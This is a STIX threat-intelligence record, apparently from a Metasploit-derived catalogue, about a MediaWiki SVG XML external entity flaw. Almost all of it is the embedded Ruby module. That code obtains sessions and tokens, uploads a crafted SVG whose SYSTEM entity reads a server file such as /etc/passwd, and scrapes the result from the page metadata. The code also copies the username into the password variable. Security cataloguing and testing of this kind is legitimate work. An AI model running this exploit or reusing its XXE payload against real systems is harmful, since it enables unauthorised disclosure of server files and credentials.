{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a4a8af7-2c84-4d67-bec6-9846e0e25f2f",
    "created": "2024-08-14T16:29:14.655799Z",
    "modified": "2024-08-14T16:29:14.655803Z",
    "name": "MediaWiki SVG XML Entity Expansion Remote File Access",
    "description": " This module attempts to read a remote file from the server using a vulnerability in the way MediaWiki handles SVG files. The vulnerability occurs while trying to expand external entities with the SYSTEM identifier. In order to work MediaWiki must be configured to accept upload of SVG files. If anonymous uploads are allowed the username and password aren't required, otherwise they are. This module has been tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10. Older versions were also tested but do not seem to be vulnerable to this vulnerability. The following MediaWiki requirements must be met: File upload must be enabled $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something other than 'false'.  'References'   => [ [ 'OSVDB', '92490' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/mediawiki_svg_fileaccess.rb",
            "external_id": "mediawiki_svg_fileaccess.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20130421060020/http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'MediaWiki SVG XML Entity Expansion Remote File Access',\n      'Description'  =>  %q{\n          This module attempts to read a remote file from the server using a vulnerability\n        in the way MediaWiki handles SVG files. The vulnerability occurs while trying to\n        expand external entities with the SYSTEM identifier. In order to work MediaWiki must\n        be configured to accept upload of SVG files. If anonymous uploads are allowed the\n        username and password aren't required, otherwise they are. This module has been\n        tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.\n        Older versions were also tested but do not seem to be vulnerable to this vulnerability.\n        The following MediaWiki requirements must be met: File upload must be enabled,\n        $wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something\n        other than 'false'.\n      },\n      'References'   =>\n        [\n          [ 'OSVDB', '92490' ],\n          [ 'URL', 'https://phabricator.wikimedia.org/T48859' ],\n          [ 'URL', 'https://web.archive.org/web/20130421060020/http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229']\n        ],\n      'Author'       =>\n        [\n          'Daniel Franke',      # Vulnerability discovery and PoC\n          'juan vazquez',       # Metasploit module\n          'Christian Mehlmauer' # Metasploit module\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(80),\n      OptString.new('TARGETURI', [true, 'Path to MediaWiki', '/mediawiki']),\n      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),\n      OptString.new('USERNAME', [ false,  \"The user to authenticate as\"]),\n      OptString.new('PASSWORD', [ false,  \"The password to authenticate with\" ])\n    ])\n\n    register_autofilter_ports([ 80 ])\n  end\n\n  def get_first_session\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"index.php\"),\n      'method'   => 'GET',\n      'vars_get' => {\n        \"title\"    => \"Special:UserLogin\",\n        \"returnto\" => \"Main+Page\"\n      }\n    })\n\n    if res && res.code == 200 && res.get_cookies =~ /([^\\s]*session)=([a-z0-9]+)/\n      return $1,$2\n    else\n      return nil\n    end\n  end\n\n  def get_login_token\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"index.php\"),\n      'method'   => 'GET',\n      'vars_get' => {\n        \"title\"    => \"Special:UserLogin\",\n        \"returnto\" => \"Main+Page\"\n      },\n      'cookie' => session_cookie\n    })\n\n    if res and res.code == 200 and res.body =~ /name=\"wpLoginToken\" value=\"([a-f0-9]*)\"/\n      return $1\n    else\n      return nil\n    end\n\n  end\n\n  def parse_auth_cookie(cookies)\n    cookies.split(\";\").each do |part|\n      case part\n        when /([^\\s]*UserID)=(.*)/\n          @wiki_user_id_name = $1\n          @wiki_user_id = $2\n        when /([^\\s]*UserName)=(.*)/\n          @wiki_user_name_name = $1\n          @wiki_user_name = $2\n        when /session=(.*)/\n          @wiki_session = $1\n        else\n          next\n      end\n    end\n  end\n\n  def session_cookie\n    if @user and @password\n      return \"#{@wiki_session_name}=#{@wiki_session}; #{@wiki_user_id_name}=#{@wiki_user_id}; #{@wiki_user_name_name}=#{@wiki_user_name}\"\n    else\n      return \"#{@wiki_session_name}=#{@wiki_session}\"\n    end\n  end\n\n  def authenticate\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"index.php\"),\n      'method'   => 'POST',\n      'vars_get' => {\n        \"title\"  => \"Special:UserLogin\",\n        \"action\" => \"submitlogin\",\n        \"type\"   => \"login\"\n      },\n      'vars_post' => {\n        \"wpName\"         => datastore['USERNAME'],\n        \"wpPassword\"     => datastore['PASSWORD'],\n        \"wpLoginAttempt\" => \"Log+in\",\n        \"wpLoginToken\"   => @login_token,\n        \"returnto\"       => \"Main+Page\"\n      },\n      'cookie' => session_cookie\n    })\n\n    if res and res.code == 302 and res.get_cookies.include?('UserID=')\n      parse_auth_cookie(res.get_cookies)\n      return true\n    else\n      return false\n    end\n  end\n\n  def get_edit_token\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"index.php\", \"Special:Upload\"),\n      'method'   => 'GET',\n      'cookie' => session_cookie\n    })\n\n    if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /<input id=\"wpEditToken\" type=\"hidden\" value=\"([0-9a-f]*)\\+\\\\\" name=\"wpEditToken\" \\/>/\n      return $1\n    else\n      return nil\n    end\n\n  end\n\n  def upload_file\n    entity = Rex::Text.rand_text_alpha_lower(3)\n    @file_name = Rex::Text.rand_text_alpha_lower(4)\n    svg_file = %Q|\n    <!DOCTYPE svg [<!ENTITY #{entity} SYSTEM \"file://#{datastore['RFILE']}\">]>\n    <svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n      <desc>&#{entity};</desc>\n      <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)\" />\n    </svg>\n    |\n    svg_file.gsub!(/\\t\\t/, \"\")\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(svg_file, \"image/svg+xml\", nil, \"form-data; name=\\\"wpUploadFile\\\"; filename=\\\"#{@file_name}.svg\\\"\")\n    post_data.add_part(\"#{@file_name.capitalize}.svg\", nil, nil, \"form-data; name=\\\"wpDestFile\\\"\")\n    post_data.add_part(\"\", nil, nil, \"form-data; name=\\\"wpUploadDescription\\\"\")\n    post_data.add_part(\"\", nil, nil, \"form-data; name=\\\"wpLicense\\\"\")\n    post_data.add_part(\"#{@edit_token}+\\\\\", nil, nil, \"form-data; name=\\\"wpEditToken\\\"\")\n    post_data.add_part(\"Special:Upload\", nil, nil, \"form-data; name=\\\"title\\\"\")\n    post_data.add_part(\"1\", nil, nil, \"form-data; name=\\\"wpDestFileWarningAck\\\"\")\n    post_data.add_part(\"Upload file\", nil, nil, \"form-data; name=\\\"wpUpload\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"index.php\", \"Special:Upload\"),\n      'method'   => 'POST',\n      'data'     => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => session_cookie\n    })\n\n    if res and res.code == 302 and res.headers['Location']\n      return res.headers['Location']\n    else\n      # try to output the errormessage\n      if res and res.body\n        error = res.body.scan(/<div class=\"error\">(.*?)<\\/div>/m)[0]\n        if error and error.size == 1\n          vprint_error(error[0])\n        end\n      end\n      return nil\n    end\n  end\n\n  def read_data\n    res = send_request_cgi({\n      'uri'      => @svg_uri,\n      'method'   => 'GET',\n      'cookie' => session_cookie\n    })\n\n    if res and res.code == 200 and res.body =~ /File:#{@file_name.capitalize}.svg/ and res.body =~ /Metadata/ and res.body =~ /<th>Image title<\\/th>\\n<td>(.*)<\\/td>\\n<\\/tr><\\/table>/m\n      return $1\n    else\n      return nil\n    end\n  end\n\n  def accessfile(rhost)\n    vprint_status(\"#{peer} MediaWiki - Getting unauthenticated session...\")\n    @wiki_session_name, @wiki_session = get_first_session\n    if @wiki_session.nil?\n      print_error(\"#{peer} MediaWiki - Failed to get unauthenticated session...\")\n      return\n    end\n    vprint_status(\"#{peer} Sessioncookie: #{@wiki_session_name}=#{@wiki_session}\")\n\n    if @user and not @user.empty? and @password and not @password.empty?\n      vprint_status(\"#{peer} MediaWiki - Getting login token...\")\n      @login_token = get_login_token\n      if @login_token.nil?\n        print_error(\"#{peer} MediaWiki - Failed to get login token\")\n        return\n      end\n      vprint_status(\"#{peer} Logintoken: #{@login_token}\")\n\n      if not authenticate\n        print_error(\"#{peer} MediaWiki - Failed to authenticate\")\n        return\n      end\n      vprint_status(\"#{peer} Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}\")\n      vprint_status(\"#{peer} Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}\")\n      vprint_status(\"#{peer} Session cookie: #{@wiki_session_name}=#{@wiki_session}\")\n    end\n\n    vprint_status(\"#{peer} MediaWiki - Getting edit token...\")\n    @edit_token = get_edit_token\n    if @edit_token.nil?\n      print_error(\"#{peer} MediaWiki - Failed to get edit token\")\n      return\n    end\n    vprint_status(\"#{peer} Edittoken: #{@edit_token}\")\n\n    vprint_status(\"#{peer} MediaWiki - Uploading SVG file...\")\n    @svg_uri = upload_file\n    if @svg_uri.nil?\n      print_error(\"#{peer} MediaWiki - Failed to upload SVG file\")\n      return\n    end\n    vprint_status(\"#{peer} SVG URI: #{@svg_uri}\")\n\n    vprint_status(\"#{peer} MediaWiki - Retrieving remote file...\")\n    loot = read_data\n    if loot.nil? or loot.empty?\n      print_error(\"#{peer} MediaWiki - Failed to retrieve remote file\")\n      return\n    end\n\n    f = ::File.basename(datastore['RFILE'])\n    path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n    print_good(\"#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}\")\n  end\n\n  def run\n    @user = datastore['USERNAME']\n    @password = datastore['USERNAME']\n    super\n  end\n\n  def run_host(ip)\n    accessfile(ip)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}